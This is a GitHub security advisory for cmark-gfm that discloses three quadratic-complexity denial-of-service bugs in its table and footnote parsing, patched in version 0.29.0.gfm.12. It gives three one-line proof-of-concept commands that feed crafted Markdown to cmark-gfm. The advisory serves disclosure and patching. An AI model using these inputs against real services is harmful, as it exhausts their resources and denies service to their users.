# Quadratic complexity bugs may lead to a denial of service

Moderate

[anticomputer](/anticomputer)
published
GHSA-w4qg-3vf7-m9x5
Jul 13, 2023

## Package

cmark-gfm

## Affected versions

0.29.0.gfm.11

## Patched versions

0.29.0.gfm.12

## Description

### Impact

Three polynomial time complexity issues in cmark-gfm may lead to unbounded resource exhaustion and subsequent denial of service.

### Proof of concept

Issue 1:

```
python3 -c 'n = 10000; print("|" + "x|" * n + "\n|" + "-|" * n)' | cmark-gfm -e table
```

Issue 2:

```
python3 -c 'n = 10000; print("|" + "x|" * n + "\n|" + "-|" * n + "\n" + "a\n" * n)' | cmark-gfm -e table
```

Issue 3:

```
python3 -c 'n = 10000; print("[^1]:" * n + "\n" * n)' | cmark-gfm -e footnotes
```

Increasing the number 10000 in the above commands causes the running time to increase quadratically.

### Patches

These vulnerabilities have been patched in 0.29.0.gfm.12.
